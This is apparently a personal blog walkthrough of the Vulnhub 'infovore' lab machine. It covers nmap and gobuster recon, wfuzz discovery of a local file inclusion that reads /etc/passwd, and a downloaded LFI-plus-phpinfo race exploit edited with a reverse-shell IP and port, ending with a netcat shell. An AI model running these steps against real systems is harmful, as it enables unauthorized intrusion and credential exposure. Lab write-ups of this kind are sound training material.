---
title: Vulnhub - infovore
description: My writeup on infovore box.
categories:
 - vulnhub
tags: vulnhub
---

![](https://i0.wp.com/wp.laravel-news.com/wp-content/uploads/2017/07/php-leader.png?fit=2200%2C1125&ssl=1?resize=2200%2C1125)

Hi all, i pwned this box long time ago but i totally forgot to do a writeup haha ! :D It is a really interesting box, let's start!

You can find the machine there > [infovore](https://www.vulnhub.com/entry/infovore-1,496/){:target="_blank"}

## Enumeration/Reconnaissance

Let's start always with nmap.

```
$ ip=192.168.1.8
$ nmap -p- --min-rate 10000 $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 23:18 EEST
Nmap scan report for 192.168.1.8 (192.168.1.8)
Host is up (0.00043s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:01:83:20 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.15 seconds
$ nmap -p 80 -sC -sV -oN nmap/initial $ip
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 23:18 EEST
Nmap scan report for 192.168.1.8 (192.168.1.8)
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Include me ...
MAC Address: 00:0C:29:01:83:20 (VMware)
```

Let's run a gobuster on it.

```
$ gobuster dir -q -u http://$ip/ -w $dir_medium -x php,txt,html -o gobuster.txt
/img (Status: 301)
/info.php (Status: 200)
/index.php (Status: 200)
/index.html (Status: 200)
/css (Status: 301)
/vendor (Status: 301)
```

Nothing interesting, i decided to do fuzz the parameter on `index.php` using wfuzz:

```
$ wfuzz -c -w $dir_medium --hw 382 http://$ip/index.php?FUZZ=/etc/passwd

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.8/index.php?FUZZ=/etc/passwd
Total requests: 220560

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                                 
===================================================================

000025370:   200        26 L     33 W     1006 Ch     "filename"                      
```

We have LFI:

```
$ curl -s http://$ip/index.php\?filename\=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Nothing interesting.. and LFI seems like it allows only `/etc/passwd`, after some google-fu i find out a really interesting tool [LFI+phpinfo=RCE](https://github.com/M4LV0/LFI-phpinfo-RCE)

We have LFI + phpinfo (info.php) let's download & edit the exploit:

```
wget -q https://raw.githubusercontent.com/M4LV0/LFI-phpinfo-RCE/master/exploit.py
```

1) We have to add our ip & port for the reverse shell:

```
$ip = '127.0.0.1';  // CHANGE THIS
$port = 3333;       // CHANGE THIS
```

2) We have to edit this:

```
POST /phpinfo.php?a= -> POST /info.php?a=
```

3) And finally this to add our LFI parameter:

```
GET /index.php?lfi= -> GET /index.php?filename=
```

Save & close and execute it:

```
$ python exploit.py $ip 80
LFI With PHPInfo()
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Getting initial offset... found [tmp_name] at 98082
Spawning worker pool (10)...

Got it! Shell created in /tmp/g

Woot!  \m/
Shuttin' down...
```

We have shell! 

```
$ nc -lvp 5555
listening on [any] 5555 ...
$ bash -i
www-data@e71b67461f6c:/$ 
``
